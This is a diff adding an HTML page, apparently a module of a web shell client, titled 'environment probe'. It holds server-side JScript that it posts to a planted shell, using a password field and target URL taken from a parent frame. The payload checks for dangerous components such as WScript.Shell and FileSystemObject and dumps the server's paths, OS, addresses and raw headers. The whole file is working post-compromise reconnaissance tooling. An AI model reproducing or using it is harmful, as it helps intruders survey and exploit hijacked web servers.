@@ -1,0 +1,111 @@
+<HTML >
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=gb2312" />
+<TITLE>环境探测</TITLE>
+<link rel="stylesheet" type="text/css" href="css.css">
+</HEAD>
+<BODY scroll="no" TOPMARGIN="0"  LEFTMARGIN="0" MARGINHEIGHT="0" MARGINWIDTH="0">
+
+<form name="codeform" method="post" action="" target=_blank>
+<textarea name="code">
+//组件检测
+var arrObj = new Array(
+	"MSWC.AdRotator",
+	"MSWC.BrowserType",
+	"MSWC.NextLink",
+	"MSWC.Tools",
+	"MSWC.Status",
+	"MSWC.Counters",
+	"IISSample.ContentRotator",
+	"IISSample.PageCounter",
+	"MSWC.PermissionChecker",
+	"WScript.Shell",
+	"Scripting.FileSystemObject",
+	"ADODB.Connection",
+	"CDONTS.NewMail"
+);
+
+var arrObjm = new Array(
+	"MSWC.AdRotator (循环显示一系列不同的广告图象)",
+	"MSWC.BrowserType (得到有关不同浏览器性能的信息)",
+	"MSWC.NextLink (把一系列的Web页连接在一起)",
+	"MSWC.Tools",
+	"MSWC.Status",
+	"MSWC.Counters (创建一个或多个计数器)",
+	"IISSample.ContentRotator (用于在一个网页上随机地显示不同的HTML内容)",
+	"IISSample.PageCounter (点击计数器)",
+	"MSWC.PermissionChecker (检查某一用户是否具有访问某一服务器端网页的权限)",
+	"WScript.Shell (提供对本地 Windows 外壳程序的访问)",
+	"Scripting.FileSystemObject (FSO)",
+	"ADODB.Connection (ActiveX数据对象[ADO])",
+	"CDONTS.NewMail (Collaboration Data Object [CDO])"
+);
+
+var objTest;
+var obj="<BR>";
+for(var i=0;i<arrObj.length;i++){
+try{
+objTest = Server.CreateObject(arrObj[i]);obj+="√ "+arrObjm[i];
+try{if(!isNaN(parseInt(objTest.Version)))obj+=" / "+objTest.Version;}
+catch(e){}
+obj+="<BR>"
+}catch(e){obj+="× "+arrObjm[i]+"<BR>";}
+}
+
+//+e.number+
+
+var xie=Request.ServerVariables("SERVER_NAME")
++"<HR>IP[PORT]: "+Request.ServerVariables("LOCAL_ADDR")+":"+Request.ServerVariables("SERVER_PORT")
++"<HR>CPU数量: "+Request.ServerVariables("NUMBER_OF_PROCESSORS")
++"<HR>脚本超时时间: "+Server.ScriptTimeout+"/S"
++"<HR>脚本引擎: "+ScriptEngine()+"/"+ScriptEngineMajorVersion()+"."+ScriptEngineMinorVersion()+"."+ ScriptEngineBuildVersion()
++"<HR>信息服务软件: "+Request.ServerVariables("SERVER_SOFTWARE")
++"<HR>操作系统: "+Request.ServerVariables("OS")
++"<HR>系统文件夹: "+Request.ServerVariables("windir")
++"<HR>时间: "+new Date()
++"<HR>本文件路径: "+Request.ServerVariables("PATH_TRANSLATED")
++"<HR>网站根目录: "+Server.Mappath("/")
+//Server.Mappath(Request.ServerVariables("SCRIPT_NAME"))
+
++"<HR>应用程序的元数据库路径: "+Request.ServerVariables("APPL_MD_PATH")
++"<HR>应用程序元数据库物理路径: "+Request.ServerVariables("APPL_PHYSICAL_PATH")
++"<HR>网关界面: "+Request.ServerVariables("GATEWAY_INTERFACE")
++"<HR>响应请求的IIS实例的元数据库路径: "+Request.ServerVariables("INSTANCE_META_PATH")
++"<HR>组件信息: "+obj
++"<HR>客户端名: "+Request.ServerVariables("REMOTE_HOST")
++"<HR>客户端IP:PORT [代理]: "+Request.ServerVariables("REMOTE_ADDR")+":"+Request.ServerVariables("REMOTE_PORT")+"["+Request.ServerVariables("HTTP_X_FORWARDED_FOR")+"]"
++"<HR>HTTP头: <pre>"+Request.ServerVariables("ALL_RAW")+"</pre>"
+Response.write(xie);
+
+/*
+Server.ScriptTimeout = 360;
+var bTest, tTimeBegin, tTimeEnd, iResultTime1,iResultTime2,sResultTime1,sResultTime2, i;
+//整数运算能力
+tTimeBegin = new Date();
+for(i=0;i<500000;++i);
+tTimeEnd = new Date();
+iResultTime1 = (tTimeEnd - tTimeBegin) / 1000;
+sResultTime1 = iResultTime1 + " S ≈" + 500000/iResultTime1 + "/S";
+	
+//浮点运算能力
+tTimeBegin = new Date();
+for(i=0;i<200000;++i) Math.sqrt(2);
+tTimeEnd = new Date();
+iResultTime2 = (tTimeEnd - tTimeBegin) / 1000;
+sResultTime2 = iResultTime2 + " S ≈" + 200000/iResultTime2 + "/S";
+Response.write("<HR/>服务器运算能力 ( 50万次'加法'运算 & 20万次'开方'运算 ) <BR>整数运算能力:"+sResultTime1+"<BR>浮点运算能力:"+sResultTime2);
+
+*/
+</textarea>
+</form>
+
+<script>
+function RUNonclick(){
+with(document.codeform){
+code.name=parent.PW.value;
+action=parent.url.value;
+submit();
+}
+}
+</script>
+</BODY></HTML>
